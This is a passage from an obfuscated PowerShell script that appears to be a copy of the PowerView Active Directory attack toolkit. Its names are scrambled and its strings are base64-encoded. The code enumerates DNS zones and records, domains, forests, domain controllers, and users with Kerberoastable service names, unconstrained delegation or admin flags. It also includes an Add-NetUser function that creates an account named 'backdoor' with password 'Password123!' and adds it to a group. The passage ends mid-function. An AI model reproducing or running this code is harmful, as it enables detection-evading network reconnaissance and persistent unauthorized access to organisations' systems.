        ${/=\_/=\_/\/=\__/=} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABJAE4ARgBPAA==')))
    }
    elseif(${__/\/\/=\/\/===\_} -eq 15) {
        ${/=\_/=\_/\/=\__/=} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'MX'
    }
    elseif(${__/\/\/=\/\/===\_} -eq 16) {
        [string]${___/=\/=\_/=\/=\/}  = ""
        [int]${/===\__/\/=\__/\/} = $DNSRecord[24]
        ${/=\/\__/=\/\/\_/=} = 25
        while (${/===\__/\/=\__/\/}-- -gt 0) {
            ${___/=\/=\_/=\/=\/} += [char]$DNSRecord[${/=\/\__/=\/\/\_/=}++]
        }
        ${/=\_/=\_/\/=\__/=} = ${___/=\/=\_/=\/=\/}
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABYAFQA')))
    }
    elseif(${__/\/\/=\/\/===\_} -eq 28) {
        ${/=\_/=\_/\/=\__/=} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBBAEEAQQA=')))
    }
    elseif(${__/\/\/=\/\/===\_} -eq 33) {
        ${/=\_/=\_/\/=\__/=} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBSAFYA')))
    }
    else {
        ${/=\_/=\_/\/=\__/=} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
    }
    ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAZABBAHQAUwBlAHIAaQBhAGwA'))) ${/=\/=\/\/\/\/\__/}
    ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABUAEwA'))) ${_/\_/\/==\/====\/}
    ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUA'))) ${__/==\_/==\_/\/==}
    ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBTAHQAYQBtAHAA'))) ${___/=\/\/\/===\/\}
    ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))) ${/=\_/=\_/\/=\__/=}
    ${/=\/==\_/\/\_/=\/}
}
filter Get-DNSZone {
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)]
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential,
        [Switch]
        $FullData
    )
    ${/=\/===\___/\/==\} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    ${/=\/===\___/\/==\}.filter=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
    if(${/=\/===\___/\/==\}) {
        ${__/==\/===\/\/\/=} = ${/=\/===\___/\/==\}.FindAll()
        ${__/==\/===\/\/\/=} | ? {$_} | % {
            $Properties = ___/\/\/\_/\___/== -Properties $_.Properties
            $Properties | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $Properties.name
            if ($FullData) {
                $Properties
            }
            else {
                $Properties | select ZoneName,distinguishedname,whencreated,whenchanged
            }
        }
        ${__/==\/===\/\/\/=}.dispose()
        ${/=\/===\___/\/==\}.dispose()
    }
    ${/=\/===\___/\/==\} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential -ADSprefix $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0ATQBpAGMAcgBvAHMAbwBmAHQARABOAFMALABEAEMAPQBEAG8AbQBhAGkAbgBEAG4AcwBaAG8AbgBlAHMA')))
    ${/=\/===\___/\/==\}.filter=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
    if(${/=\/===\___/\/==\}) {
        ${__/==\/===\/\/\/=} = ${/=\/===\___/\/==\}.FindAll()
        ${__/==\/===\/\/\/=} | ? {$_} | % {
            $Properties = ___/\/\/\_/\___/== -Properties $_.Properties
            $Properties | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $Properties.name
            if ($FullData) {
                $Properties
            }
            else {
                $Properties | select ZoneName,distinguishedname,whencreated,whenchanged
            }
        }
        ${__/==\/===\/\/\/=}.dispose()
        ${/=\/===\___/\/==\}.dispose()
    }
}
filter Get-DNSRecord {
    param(
        [Parameter(Position=0, ValueFromPipelineByPropertyName=$True, Mandatory=$True)]
        [String]
        $ZoneName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)]
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    ${/=\/===\___/\/==\} = __/=====\_/\_/==== -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential -ADSprefix "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
    ${/=\/===\___/\/==\}.filter=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBOAG8AZABlACkA')))
    if(${/=\/===\___/\/==\}) {
        ${__/==\/===\/\/\/=} = ${/=\/===\___/\/==\}.FindAll()
        ${__/==\/===\/\/\/=} | ? {$_} | % {
            try {
                $Properties = ___/\/\/\_/\___/== -Properties $_.Properties | select name,distinguishedname,dnsrecord,whencreated,whenchanged
                $Properties | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $ZoneName
                if ($Properties.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                    ${___/=\_/=\/\_____} = __/\/\___/\____/=\ -DNSRecord $Properties.dnsrecord[0]
                }
                else {
                    ${___/=\_/=\/\_____} = __/\/\___/\____/=\ -DNSRecord $Properties.dnsrecord
                }
                if(${___/=\_/=\/\_____}) {
                    ${___/=\_/=\/\_____}.psobject.properties | % {
                        $Properties | Add-Member NoteProperty $_.Name $_.Value
                    }
                }
                $Properties
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBSAFIATwBSADoAIAAkAF8A')))
                $Properties
            }
        }
        ${__/==\/===\/\/\/=}.dispose()
        ${/=\/===\___/\/==\}.dispose()
    }
}
filter ______/====\/=\__/ {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        $Credential
    )
    if($Credential) {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEcAZQB0AC0ATgBlAHQARABvAG0AYQBpAG4A')))
        if(!$Domain) {
            $Domain = $Credential.GetNetworkCredential().Domain
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnACAAZgByAG8AbQAgAC0AQwByAGUAZABlAG4AdABpAGEAbAA=')))
        }
        ${___/\/=\_/=\_/===} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${___/\/=\_/=\_/===})
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGQAbwBtAGEAaQBuACAAZABvAGUAcwAgACcAJABEAG8AbQBhAGkAbgAnACAAbgBvAHQAIABlAHgAaQBzAHQALAAgAGMAbwB1AGwAZAAgAG4AbwB0ACAAYgBlACAAYwBvAG4AdABhAGMAdABlAGQALAAgAHQAaABlAHIAZQAgAGkAcwBuACcAdAAgAGEAbgAgAGUAeABpAHMAdABpAG4AZwAgAHQAcgB1AHMAdAAsACAAbwByACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGEAcgBlACAAaQBuAHYAYQBsAGkAZAAuAA==')))
            $Null
        }
    }
    elseif($Domain) {
        ${___/\/=\_/=\_/===} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${___/\/=\_/=\_/===})
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAEQAbwBtAGEAaQBuACcAIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQALAAgAGMAbwB1AGwAZAAgAG4AbwB0ACAAYgBlACAAYwBvAG4AdABhAGMAdABlAGQALAAgAG8AcgAgAHQAaABlAHIAZQAgAGkAcwBuACcAdAAgAGEAbgAgAGUAeABpAHMAdABpAG4AZwAgAHQAcgB1AHMAdAAuAA==')))
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}
filter ___/\____/\/\_/\__ {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        $Credential
    )
    if($Credential) {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEcAZQB0AC0ATgBlAHQARgBvAHIAZQBzAHQA')))
        if(!$Forest) {
            $Forest = $Credential.GetNetworkCredential().Domain
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJABGAG8AcgBlAHMAdAAnACAAZgByAG8AbQAgAC0AQwByAGUAZABlAG4AdABpAGEAbAA=')))
        }
        ${_____/\/\_/\/=\__} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        try {
            ${/==\/\/\/\/\/=\/\} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${_____/\/\_/\/=\__})
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByAGUAcwB0ACAAJwAkAEYAbwByAGUAcwB0ACcAIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQALAAgAGMAbwB1AGwAZAAgAG4AbwB0ACAAYgBlACAAYwBvAG4AdABhAGMAdABlAGQALAAgAHQAaABlAHIAZQAgAGkAcwBuACcAdAAgAGEAbgAgAGUAeABpAHMAdABpAG4AZwAgAHQAcgB1AHMAdAAsACAAbwByACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGEAcgBlACAAaQBuAHYAYQBsAGkAZAAuAA==')))
            $Null
        }
    }
    elseif($Forest) {
        ${_____/\/\_/\/=\__} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest)
        try {
            ${/==\/\/\/\/\/=\/\} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${_____/\/\_/\/=\__})
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByAGUAcwB0ACAAJwAkAEYAbwByAGUAcwB0ACcAIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQALAAgAGMAbwB1AGwAZAAgAG4AbwB0ACAAYgBlACAAYwBvAG4AdABhAGMAdABlAGQALAAgAG8AcgAgAHQAaABlAHIAZQAgAGkAcwBuACcAdAAgAGEAbgAgAGUAeABpAHMAdABpAG4AZwAgAHQAcgB1AHMAdAAuAA==')))
            return $Null
        }
    }
    else {
        ${/==\/\/\/\/\/=\/\} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
    if(${/==\/\/\/\/\/=\/\}) {
        ${/==\____/===\/=\_} = (New-Object System.Security.Principal.NTAccount(${/==\/\/\/\/\/=\/\}.RootDomain,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))))).Translate([System.Security.Principal.SecurityIdentifier]).Value
        ${_/====\__/=\/====} = ${/==\____/===\/=\_} -Split "-"
        ${/==\____/===\/=\_} = ${_/====\__/=\/====}[0..$(${_/====\__/=\/====}.length-2)] -join "-"
        ${/==\/\/\/\/\/=\/\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) ${/==\____/===\/=\_}
        ${/==\/\/\/\/\/=\/\}
    }
}
filter ___/\/\___/=\/==\/ {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        $Credential
    )
    ${/==\/\/\/\/\/=\/\} = ___/\____/\/\_/\__ -Forest $Forest -Credential $Credential
    if(${/==\/\/\/\/\/=\/\}) {
        ${/==\/\/\/\/\/=\/\}.Domains
    }
}
filter Get-NetForestCatalog {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        $Credential
    )
    ${/==\/\/\/\/\/=\/\} = ___/\____/\/\_/\__ -Forest $Forest -Credential $Credential
    if(${/==\/\/\/\/\/=\/\}) {
        ${/==\/\/\/\/\/=\/\}.FindAllGlobalCatalogs()
    }
}
filter __/=\____/=\/=\__/ {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        $Credential
    )
    if($LDAP -or $DomainController) {
        _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    else {
        ${_/====\/=\___/===} = ______/====\/=\__/ -Domain $Domain -Credential $Credential
        if(${_/====\/=\___/===}) {
            ${_/====\/=\___/===}.DomainControllers
        }
    }
}
function __/=\_/\_/\/=\___/ {
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $UserName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $Filter,
        [Switch]
        $SPN,
        [Switch]
        ${____/====\____/\_/},
        [Switch]
        $Unconstrained,
        [Switch]
        ${__/\/=\____/\/\__/},
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        ${__/==\__/==\/\/\_} = __/=====\_/\_/==== -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    }
    process {
        if(${__/==\__/==\/\/\_}) {
            if($Unconstrained) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AG4AYwBvAG4AcwB0AHIAYQBpAG4AZQBkACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if(${__/\/=\____/\/\__/}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if(${____/====\____/\_/}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if($UserName) {
                ${__/==\__/==\/\/\_}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAHMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQA9ACQAVQBzAGUAcgBOAGEAbQBlACkAJABGAGkAbAB0AGUAcgApAA==')))
            }
            elseif($SPN) {
                ${__/==\__/==\/\/\_}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAHMAZQByAHYAaQBjAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA9ACoAKQAkAEYAaQBsAHQAZQByACkA')))
            }
            else {
                ${__/==\__/==\/\/\_}.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAkAEYAaQBsAHQAZQByACkA')))
            }
            ${__/==\/===\/\/\/=} = ${__/==\__/==\/\/\_}.FindAll()
            ${__/==\/===\/\/\/=} | ? {$_} | % {
                ${_/\_/=\/\/=\_/===} = ___/\/\/\_/\___/== -Properties $_.Properties
                ${_/\_/=\/\/=\_/===}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))))
                ${_/\_/=\/\/=\_/===}
            }
            ${__/==\/===\/\/\/=}.dispose()
            ${__/==\__/==\/\/\_}.dispose()
        }
    }
}
function Add-NetUser {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'backdoor',
        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )
    if ($Domain) {
        ${/=\/\_/====\_____} = ______/====\/=\__/ -Domain $Domain
        if(-not ${/=\/\_/====\_____}) {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAZwByAGEAYgBiAGkAbgBnACAAJABEAG8AbQBhAGkAbgAgAG8AYgBqAGUAYwB0AA==')))
            return $Null
        }
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        ${___/\/=\_______/=} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), ${/=\/\_/====\_____}
        ${_/\_/=\/\/=\_/===} = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ${___/\/=\_______/=}
        ${_/\_/=\/\/=\_/===}.Name = $UserName
        ${_/\_/=\/\/=\_/===}.SamAccountName = $UserName
        ${_/\_/=\/\/=\_/===}.PasswordNotRequired = $False
        ${_/\_/=\/\/=\_/===}.SetPassword($Password)
        ${_/\_/=\/\/=\_/===}.Enabled = $True
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAAdQBzAGUAcgAgACQAVQBzAGUAcgBOAGEAbQBlACAAdABvACAAdwBpAHQAaAAgAHAAYQBzAHMAdwBvAHIAZAAgACcAJABQAGEAcwBzAHcAbwByAGQAJwAgAGkAbgAgAGQAbwBtAGEAaQBuACAAJABEAG8AbQBhAGkAbgA=')))
        try {
            ${_/\_/=\/\/=\_/===}.Save()
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQAIABpAG4AIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4A')))
        }
        catch {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABVAHMAZQByACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzACEA')))
            return
        }
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAAdQBzAGUAcgAgACQAVQBzAGUAcgBOAGEAbQBlACAAdABvACAAdwBpAHQAaAAgAHAAYQBzAHMAdwBvAHIAZAAgACcAJABQAGEAcwBzAHcAbwByAGQAJwAgAG8AbgAgACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
        ${_/=\__/\/=\/\/=\_} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
        ${_/=\/==\_/\_/=\/\} = ${_/=\__/\/=\/\/=\_}.Create($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))), $UserName)
        ${_/=\/==\_/\_/=\/\}.SetPassword($Password)
        try {
            $Null = ${_/=\/==\_/\_/=\/\}.SetInfo()
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQAIABvAG4AIABoAG8AcwB0ACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA=')))
        }
        catch {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABBAGMAYwBvAHUAbgB0ACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzACEA')))
            return
        }
    }
    if ($GroupName) {
        if ($Domain) {
            ___/\/\_/\_/\/\/\/ -UserName $UserName -GroupName $GroupName -Domain $Domain
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAZABkAGUAZAAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABpAG4AIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4A')))
        }
        else {
            ___/\/\_/\_/\/\/\/ -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAZABkAGUAZAAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABvAG4AIABoAG8AcwB0ACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA=')))
        }
    }
}
function ___/\/\_/\_/\/\/\/ {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,
        [String]
        $Domain
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    if($ComputerName -and ($ComputerName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAGgAbwBzAHQA'))))) {
        try {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQBuAGcAIAB1AHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIAB0AG8AIAAkAEcAcgBvAHUAcABOAGEAbQBlACAAbwBuACAAaABvAHMAdAAgACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
            ([ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUALwAkAEcAcgBvAHUAcABOAGEAbQBlACwAZwByAG8AdQBwAA==')))).add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUALwAkAFUAcwBlAHIATgBhAG0AZQAsAHUAcwBlAHIA'))))
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAZABkAGUAZAAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABvAG4AIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
        }
        catch {
